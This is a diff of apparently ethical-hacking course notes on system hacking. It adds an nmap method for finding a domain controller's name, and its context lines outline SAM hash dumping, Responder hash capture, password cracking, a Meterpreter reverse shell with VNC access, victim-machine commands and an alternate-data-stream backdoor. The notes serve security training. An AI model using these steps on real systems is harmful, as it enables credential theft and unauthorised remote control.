@@ -2,19 +2,46 @@
 
 ## Module 06 - System Hacking
 
-### Dump and Crack SAM (Security Account Manager) hashes
+## Finding FQDN <a href="#effd" id="effd"></a>
+
+**FQDN** stands for Fully Qualified Domain Name. It is a complete and unambiguous domain name that specifies a host's exact location in the Domain Name System (DNS) hierarchy. An FQDN includes both the host's hostname and its domain name, providing a full and unique address for a specific resource on the internet.
+
+FQDN (**FQDN = Hostname + Domain**) an example can be: mail.example.com mail (hostname), example.com (domain).
+
+In windows, if we go into advanced system settings and system properties, we've full computer name and workgroup name, if we've workgroup name it means that we've not a centralized Domain Controller, then the full computer name consists of just the computer name without domain name.
+
+While, in another scenario, if we see System control panel, at computer name, domain and worgroup settings we see a more long full computer name because we've Domain Controller associated.
+
+### Find FQDN of domain controller using Nmap <a href="#effd" id="effd"></a>
+
+We can find FQDN using nmap of domain controller in a subnet
+
+* `nmap -p389 -sV -iL <target_list>` -> if we've more targets IP
+
+or
+
+* `nmap -p389 -sV <target_IP>`
+
+port 389 regarding LDAP service: protocol used for accessing and maintaining directory info such as user account within a network. We can associated it functionality as a phonebook or address book that helps you to search, retrieve and update info in that directory.&#x20;
+
+Running nmap command we'll retrieve info about Domain and Host name:
+
+* Domain: pentester.team Service Info: Host: DC;
+* then FQDN = DC.pentester.team
+
+## Dump and Crack SAM (Security Account Manager) hashes
 
 Windows stores passwords in LM and NTLM hash format | NTLM New Technology LAN Manager.
 
 Need admin access to dump SAM.
 
-### WMIC (Windows Management Instrumentation Command) CLI to get info about local system&#x20;
+## WMIC (Windows Management Instrumentation Command) CLI to get info about local system&#x20;
 
 ```bash
 wmic useraccount get name,sid | displays usernames and their SIDs
 ```
 
-### LLMNR / NBT-NS Spoofing
+## LLMNR / NBT-NS Spoofing
 
 [Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes
 
@@ -29,13 +56,13 @@ responder -I eth0
 john SMB<filename>
 ```
 
-### **NTLM Hash crack**
+## **NTLM Hash crack**
 
 * esponder -I eth0
 * usr\share\responder\logs --> Responder log location
 * john /usr/share/responder/logs/ntlm.txt
 
-### **Rainbow table crack using Winrtgen**
+## **Rainbow table crack using Winrtgen**
 
 * Open winrtgen and add new table
 * Select ntlm from Hash dropdown list.
@@ -43,9 +70,9 @@ john SMB<filename>
 * Select loweralpha from Charset dropdown list (it depends upon Password).
 * rcrack\_gui.exe to crack hash with rainbow table
 
-### **Hash dump with Pwdump7 and crack with Ophcrack**
+## **Hash dump with Pwdump7 and crack with Ophcrack**
 
-#### Pwdump7 (To dump password hashes)
+### Pwdump7 (To dump password hashes)
 
 * pwdump7.exe -d c:\lockedfile.dat backup-lockedfile.dat |dump protected file
 * Browse admin terminal to pwdump7 path and run pwdump.exe in cmd -> shows password hashes
@@ -56,7 +83,7 @@ john SMB<filename>
 pwDump7.exe : To Dump Windows Hashes
 {% endembed %}
 
-#### Ophcrack (To crack password hashes)
+## Ophcrack (To crack password hashes)
 
 To crack passwords not longer than 14 characters using only alphanumeric characters
 
@@ -69,13 +96,13 @@ To crack passwords not longer than 14 characters using only alphanumeric charact
 Ophcrack.exe : To Crack SAM Hashes to obtain clear password
 {% endembed %}
 
-#### Winrtgen – Create Rainbow table
+### Winrtgen – Create Rainbow table
 
 * Click on add table
 * Select hash NTLM, min length 4, max length 6, Chain Count 4000000, Charset Loweralpha
 * Click OK on main window to start , table is saved in Winrtgen folder.
 
-#### Rainbow Crack
+### Rainbow Crack
 
 * Open rcrack\_gui.exe
 * Click File, then select Load NTLM hashes from PWDUMP
@@ -93,7 +120,7 @@ Or
 rcrack\_gui.exe : Use Raindow Table to crack hashes
 {% endembed %}
 
-### **Perform Active Online Attack to Crack the System's Password using Responder**
+## **Perform Active Online Attack to Crack the System's Password using Responder**
 
 #### **Linux:**
 
@@ -115,7 +142,7 @@ rcrack\_gui.exe : Use Raindow Table to crack hashes
 * passwd: \*\*\*\*
 * **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**
 
-### Establish VNC connection to target machine using MSFVENOM and MSFCONSLE
+## Establish VNC connection to target machine using MSFVENOM and MSFCONSLE
 
 #### Payload setup&#x20;
 
@@ -146,7 +173,7 @@ Run
 * Download Payload and run. Meterpreter shell is opened on attacker side. Type `sysinfo` to get system details.
 * Type `run vnc` to start vnc viewer.
 
-### Create a Reverse TCP Connection
+## Create a Reverse TCP Connection
 
 ```bash
 # creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
@@ -225,7 +252,7 @@ idletime #shows the time the target user has been away from keyboard
 shutdown #shutdown the victim machine
 ```
 
-### Hiding file in NTFS stream
+## Hiding file in NTFS stream
 
 The NTFS file system includes support for alternate data streams. A file stream is a sequence of bytes that contains data about a file, such as keywords or the identity of the user who created the file. Think of a data stream as a file within a file — a hidden file residing within a legitimate one. Each stream has its own disk space allocation, its own actual size (bytes in use) and its own file locks.
 
@@ -236,7 +263,7 @@ The NTFS file system includes support for alternate data streams. A file stream 
 * Type `mklink backdoor.exe readme.txt:calc.exe` -> create a link to the ADS file to create backdoor
 * Execute backdoor.exe
 
-### Hiding Data Using White Space Steganography
+## Hiding Data Using White Space Steganography
 
 * Create a text file readme.txt like this below
 
